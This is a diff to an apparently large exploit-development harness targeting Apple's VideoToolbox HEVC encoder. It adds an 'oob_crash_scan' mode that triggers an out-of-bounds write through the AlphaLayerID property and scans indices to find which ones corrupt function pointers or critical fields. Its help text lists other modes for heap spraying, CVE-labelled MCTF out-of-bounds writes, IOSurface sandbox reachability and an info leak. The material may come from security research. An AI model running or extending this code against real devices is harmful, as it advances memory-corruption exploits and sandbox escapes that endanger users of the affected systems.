@@ -7237,6 +7237,87 @@ vps_cd_done:
 
         rlog("\n=== HEAP_SPRAY_OOB complete ===\n");
 
+    } else if (strcmp(mode, "oob_crash_scan") == 0) {
+        /*
+         * oob_crash_scan — Find which OOB index hits critical struct fields
+         *
+         * Creates VTCompressionSession with each AlphaLayerID from 64 to max,
+         * calls PrepareToEncodeFrames (which does the OOB write), then
+         * invalidates. If a specific index corrupts a function pointer or
+         * critical field, the process may crash — the last logged index
+         * tells us which offset is critical.
+         *
+         * Uses regular HEVC codec. Each session gets its own sHEVC_VPS
+         * allocation, so corruption is isolated per-session.
+         *
+         * Safety: each session is created then immediately invalidated,
+         * limiting the window for the corrupted state to cause issues.
+         */
+        int start_aid = (argc > 2) ? atoi(argv[2]) : 64;
+        int end_aid = (argc > 3) ? atoi(argv[3]) : 255;
+        int use_muxa = (argc > 4) ? atoi(argv[4]) : 0;
+        if (start_aid < 0) start_aid = 0;
+        if (end_aid > 255) end_aid = 255;
+
+        rlog("=== OOB_CRASH_SCAN: Probe OOB indices %d-%d ===\n", start_aid, end_aid);
+        rlog("Codec: %s, resolution: 192x192\n\n", use_muxa ? "muxa" : "HEVC");
+
+        CMVideoCodecType codec = use_muxa ?
+            (CMVideoCodecType)0x6D757861 : kCMVideoCodecType_HEVC;
+
+        for (int aid = start_aid; aid <= end_aid; aid++) {
+            rlog("AID=%3d: ", aid);
+
+            VTCompressionSessionRef s = NULL;
+            CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFDictionarySetValue(enc_spec,
+                CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+            if (!use_muxa)
+                CFDictionarySetValue(enc_spec,
+                    CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+
+            OSStatus st = VTCompressionSessionCreate(NULL, 192, 192,
+                codec, enc_spec, NULL, NULL, encode_cb, NULL, &s);
+            CFRelease(enc_spec);
+            if (st != noErr || !s) { rlog("create=%d SKIP\n", (int)st); continue; }
+
+            VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+            VTSessionSetProperty(s, CFSTR("EncodesAlpha"), kCFBooleanTrue);
+            CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &aid);
+            OSStatus sp = VTSessionSetProperty(s,
+                CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
+            CFRelease(aidn);
+
+            st = VTCompressionSessionPrepareToEncodeFrames(s);
+            rlog("set=%d prep=%d", (int)sp, (int)st);
+
+            if (st == noErr) {
+                /* Try a quick encode to exercise the corrupted state */
+                g_encode_done = 0; g_cb_status = -999;
+                CVPixelBufferRef pb = NULL;
+                CVPixelBufferCreate(NULL, 192, 192, kCVPixelFormatType_32BGRA, NULL, &pb);
+                if (pb) {
+                    CVPixelBufferLockBaseAddress(pb, 0);
+                    void *base = CVPixelBufferGetBaseAddress(pb);
+                    if (base) memset(base, 0x42, CVPixelBufferGetDataSize(pb));
+                    CVPixelBufferUnlockBaseAddress(pb, 0);
+                    CMTime pts = CMTimeMake(0, 30);
+                    VTCompressionSessionEncodeFrame(s, pb, pts, kCMTimeInvalid, NULL, NULL, NULL);
+                    for (int ww = 0; ww < 100 && !g_encode_done; ww++) usleep(10000);
+                    rlog(" enc=%d", (int)g_cb_status);
+                    CVPixelBufferRelease(pb);
+                }
+            }
+            rlog(" OK\n");
+
+            VTCompressionSessionInvalidate(s);
+            CFRelease(s);
+            usleep(20000); /* 20ms between sessions */
+        }
+
+        rlog("\n=== OOB_CRASH_SCAN complete (all indices survived) ===\n");
+
     } else if (strcmp(mode, "vps_byte_dump") == 0) {
         /*
          * vps_byte_dump — Dump raw VPS NAL bytes at varying AlphaLayerID values
@@ -7488,6 +7569,7 @@ vps_cd_done:
         rlog("  vps_corrupt_detect [aid] [rounds] -- Detect OOB VPS write corruption\n");
         rlog("  mctf_oob [max]     -- KEY: CVE-112468/112469 MCTF OOB via encode properties\n");
         rlog("  iosurface_probe    -- KEY: IOSurface sandbox access + CVE-112477 reachability\n");
+        rlog("  oob_crash_scan [start] [end] [muxa] -- Scan OOB indices for crash/critical fields\n");
         rlog("  vps_byte_dump [max_aid] -- KEY: Dump VPS bytes at OOB AlphaLayerID (info leak)\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
